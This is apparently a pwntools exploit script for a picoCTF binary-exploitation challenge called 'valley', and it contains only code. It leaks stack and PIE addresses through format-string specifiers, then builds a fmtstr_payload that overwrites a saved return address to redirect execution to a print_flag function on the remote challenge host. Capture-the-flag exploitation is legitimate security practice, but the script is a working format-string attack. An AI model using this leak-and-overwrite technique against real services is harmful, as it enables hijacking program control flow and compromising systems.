from pwn import *
exe = context.binary = ELF("./valley")
r = process()
r = remote("shape-facility.picoctf.net",61471)
fflush = 0
print_flag = 0
r.sendline("%21$p")
r.recvuntil(b"You heard in the distance: ")
leak_main = int(r.recvline().strip().decode(),16)
r.sendline("%20$p")
r.recvuntil(b"You heard in the distance: ")
leak_libc = int(r.recvline().strip().decode(),16) - 0x88
exe.address = leak_main - (exe.sym['main'] + 18)
log.info(f"{hex(exe.address)}")
log.info(f"{hex(leak_libc)}")
exit_got = exe.address + 0x4010
print_flag = exe.address + 0x1269
payload = fmtstr_payload(6,{leak_libc:print_flag},write_size='short')
r.sendline(payload)
# sleep(15)
# r.sendline("exit")
r.shutdown('send')
log.info(f"{hex(exit_got)}")
log.info(f"{hex(print_flag)}")
r.interactive()
print(len(payload))
